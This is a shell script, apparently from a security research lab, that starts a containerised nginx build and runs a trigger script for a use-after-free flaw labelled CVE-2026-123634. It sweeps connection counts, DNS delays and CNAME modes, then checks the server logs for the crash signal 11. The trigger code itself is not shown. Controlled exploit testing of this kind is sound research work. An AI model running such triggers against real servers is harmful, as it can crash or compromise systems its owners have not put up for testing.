#!/bin/bash
# CVE-2026-123634 트리거 러너 — cve123634 프로파일(123634 arm + dnssim) 기동·실행·관측
# 사용: ops/run_123634.sh <episode명> [conns] [dns-delay] [direct|cname|cname-nx]
set -euo pipefail
cd "$(dirname "$0")/.."

EP="${1:?episode required (e.g. ep01)}"
CONNS="${2:-30}"
DELAY="${3:-3}"
MODE="${4:-direct}"

docker compose -f ops/docker/compose.yaml --profile cve123634 up -d 2>&1 | tail -1
docker restart n2r-123634 >/dev/null    # 프레시 worker
sleep 1

echo "── 트리거 실행 (conns=$CONNS delay=$DELAY mode=$MODE)"
docker run --rm --network nginx2root-lab_default \
  -v "$PWD/exploit:/work/exploit" \
  python:3.10-slim \
  python3 /work/exploit/trigger/trigger_123634.py \
    --host n2r-123634 --port 443 --tls \
    --conns "$CONNS" --dns-delay "$DELAY" --mode "$MODE" \
    --arm a1 --episode "$EP" || true

EPDIR="exploit/results/CVE-2026-123634/a1/$EP"
mkdir -p "$EPDIR"
echo "── 서버 관측 (ALERT=경로 도달 지표 / signal 11=UAF / CNAME 재질의=경로 활성)"
docker logs n2r-123634 2>&1 | grep -E 'could not cancel|signal 11|exited on signal|CNAME|cname' \
  | grep -vE 'src=' | tail -10 | tee "$EPDIR/server_observation.txt" || echo "(관측 없음 — 미지지)"
grep -q 'could not cancel' "$EPDIR/server_observation.txt" 2>/dev/null \
  && echo "판정: 경로 도달 (지지됨) — UAF 크래시 여부와 별개" || true
grep -qE 'signal 11' "$EPDIR/server_observation.txt" 2>/dev/null \
  && echo "판정: UAF-확정 (SIGSEGV)" || true
